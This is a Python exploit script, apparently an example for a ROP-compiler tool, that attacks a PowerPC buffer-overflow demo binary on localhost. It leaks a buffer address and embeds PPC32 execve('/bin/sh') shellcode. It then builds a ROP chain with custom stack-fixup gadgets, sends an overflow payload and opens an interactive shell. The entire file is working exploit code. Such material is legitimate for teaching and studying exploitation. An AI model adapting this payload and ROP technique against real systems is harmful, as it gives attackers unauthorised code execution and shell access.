import sys, logging
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './example/ppc_bof'
p = remote('localhost', 2222)
buffer_address = struct.unpack(">I", p.read(4))[0]

shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-86.php
  "\x7c\x3f\x0b\x78" + # mr  r31,r1
  "\x7c\xa5\x2a\x79" + # xor.  r5,r5,r5
  "\x42\x40\xff\xf9" + # bdzl next_instruction
  "\x7f\x08\x02\xa6" + # mflr  r24
  "\x3b\x18\x01\x34" + # addi  r24,r24,308
  "\x98\xb8\xfe\xfb" + # stb r5,-261(r24)
  "\x38\x78\xfe\xf4" + # addi  r3,r24,-268
  "\x90\x61\xff\xf8" + # stw r3,-8(r1)
  "\x38\x81\xff\xf8" + # addi  r4,r1,-8
  "\x90\xa1\xff\xfc" + # stw r5,-4(r1)
  "\x3b\xc0\x01\x60" + # li  r30,352
  "\x7f\xc0\x2e\x70" + # srawi r0,r30,5
  "\x44\x00\x00\x02" + # sc
  "/bin/shZ"           # the last byte becomes NULL
)
target_address = buffer_address + 700
print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)

rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchPPC32('Iend_BE'), logging.DEBUG)

payload = 'A'*512 + 'B'*0x1c
# We need some custom gadgets to fixup the stack because of the PPC function saving the lr above the current stack frame
payload += struct.pack(">i", 0x10000670) + "C" * 12 + struct.pack(">i", 0x1000066c) + "D"*4 # how annoying
payload += rop
payload += ((700 - len(payload)) * 'E') + shellcode
payload += "JEFF" # To end our input

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()

